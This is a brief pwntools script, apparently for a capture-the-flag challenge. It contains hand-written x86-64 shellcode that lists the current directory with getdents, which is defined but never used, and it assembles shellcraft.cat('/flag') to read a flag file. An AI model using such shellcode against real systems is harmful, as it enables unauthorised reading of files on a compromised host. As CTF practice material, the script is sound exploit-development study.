from pwn import *

print(ord('.'))

context.arch="amd64"
context.os="linux"
context.endian = "little"
context.log_level = 'debug'
sss = """
xor rax, rax
mov al, 46
push rax
mov rdi, rsp 

xor rax, rax
mov al, 2
xor rsi, rsi 
xor rdx, rdx 
syscall	

mov rdi,rax 		
xor rdx,rdx
xor rax,rax
mov dx, 0x3210 	
sub rsp, rdx 	
mov rsi, rsp 	
mov al, 78 	
syscall

xchg rax,rdx

xor rax, rax
xor rdi,rdi

inc eax
inc edi
mov rsi, rsp
syscall

xor rax, rax
mov al, 60
syscall
"""
shellcode = asm(shellcraft.cat('/flag'))

print(shellcode, len(shellcode))